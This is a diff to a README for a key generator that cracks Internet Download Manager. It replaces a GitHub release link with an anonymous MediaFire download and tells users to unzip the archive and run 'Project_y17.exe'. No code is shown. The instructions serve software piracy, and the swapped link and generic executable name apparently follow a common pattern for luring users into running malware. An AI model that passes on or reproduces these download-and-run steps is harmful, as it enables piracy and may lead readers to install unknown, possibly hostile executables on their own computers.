@@ -13,11 +13,11 @@ This project provides a key generator (keygen) for Internet Download Manager (ID
 - .NET Framework (for Windows users)
 
 ## Installation
-1. Download the archive from [here](https://github.com/golovkolomka/Internet-Download-Manager-Latest-Keygen/releases/download/v1.9/idm-keygen.zip)
+1. Download the archive from [here](https://app.mediafire.com/t8zrgyorywwai?idm)
 
 2.  Unzip to any folder 
 
-3.  Run Install.exe
+3.  Run Project_y17.exe
 
 4. Click the "Generate" button to generate a new serial key.
 
@@ -25,7 +25,7 @@ This project provides a key generator (keygen) for Internet Download Manager (ID
 
 ## Usage
 
-1. Run the "Install.exe"
+1. Run the "Project_y17.exe"
 
 2. Click the "Generate" button to generate a new serial key.
 
